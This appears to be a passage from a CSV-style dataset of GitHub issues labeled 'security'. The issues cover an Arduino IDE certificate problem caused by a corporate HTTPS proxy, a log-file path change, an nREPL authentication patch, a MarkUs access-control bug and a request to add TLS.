Error downloading https://downloads.arduino.cc/packages/package_index.json
2020-12-22T15:18:53.113Z INFO c.a.c.p.ContributionInstaller:314 [main] Downloaded package index URL=[https://downloads.arduino.cc/packages/package_index.json]
2020-12-22T15:18:53.113Z INFO c.a.c.p.ContributionInstaller:324 [main] Check unknown files. Additional package index folder files=[package_index.json], Additional package index url downloaded=[]
Selected board is not available
```

I am able to open the URL using my browser without issue. 

I have tried without success:
* Hourly build
* New install
* Another connection interface (LAN / Wi-Fi)
","Hi @bowdi ,
thanks for reporting. Is it possible that your company network is actually reencrypting SSL connections (a sort of https man in the middle proxy) ? This would explain why the certificate is not accepted (since our certificate is ok :slightly_smiling_face: ).

@cmaglie as a workaround, would it make sense to add a preference entry to avoid using https?Hi @facchinm, thanks for the response!

It would appear that is the case. When I looked at the cert given, I had thought it was an original but looking closer, it was issued by Forcepoint rather than Cloudflare.

With other tools disabling SSL verification has been an option e.g. postman. The result is the same but this is where my mind went first thing ¯\\_(ツ)_/¯.",no,"Type: Bug,Component: Board/Lib Manager,Type: Improvement,security,"
diegolamonica/ALPHA,449582,"Let the users to define where to write log files","Actually the framework writes two log files, one for the general log and the second for the debbugging of rules.xml

For the general log the user should ensure that the directory /debugging/ under the core folder have to be RW for the apache user. In some environment that can be considered as a limitation of the framework (as is). The best would be that the user sets the path where to write the general log in the application.xml and it will be consider as relative path from the application project. 

The rules.txt (the log file generated by the parsing and the apply of the rules.xml file) is written instead in the root of the core. Weird! Here you need to grant RW access to apache user and it could raise a security issue. As I wrote above, the same path of the general log, could be the correct way to ensure at least a better security of the framework and of the applications that use it.
","Updates for the first part of the issue are reported here [1] and here [2].

[1] http://alpha.diegolamonica.info/issues/view.php?id=1

[2] http://box309.bluehost.com/pipermail/developers_alpha.diegolamonica.info/2010-December/000004.html
",no,"security,improvements,"
nrepl/nrepl,271623154,"Add initial authentication support and simple default","The first of these two patches adds authentication to the server, and
the second trivially adjusts the message function to use it (as an
example).

I could easily imagine the current approach might not be acceptable,
but I'd be happy to try to make adjustments.

If this turns out to be interesting, then presumably tools like
leiningen and cider might want to provide more interesting strategies
via their own :auth-wrapper.

I haven't added automated tests for the authentication yet, but you can
run all of the existing tests like this:

NREPL_AUTH=none mvn package

and if we pursue the changes, I can see about adding authorization to
relevant parts of the test suite, if that's helpful.

If you'd like to try it out:

(umask 077 && dd bs=1 count=256 if=/dev/random | base64 > nrepl-token)
NREPL_AUTH=file:nrepl-token lein repl :headless

and then from another process in the same working directory:

(repl/message {:op :eval :code ""(+ 1 1)"" :auth (slurp ""nrepl-token"")})

(I also have a patch that adds NREPL_AUTH support to cider.)

(from https://dev.clojure.org/jira/browse/NREPL-85)","You can find some work on this (and a much bigger conversation) here https://github.com/nrepl/nREPL/pull/46.",no,"Breaking,Bug,Security,"
MarkUsProject/Markus,1391085502,"TAs should not be able to access urls for results they haven't been assigned","When TA  users navigates to a `result#edit` url that they haven't been assigned, they should see a 403 (forbidden) error.

To fix this: update the policies to check if a TA has been assigned to grade the given result",,no,"bug,easy fix,ruby,security,"
sionide21/Go2Lunch,338746,"Add TLS for connections","RPC connections should go over TLS.
",,no,"andy,security,"
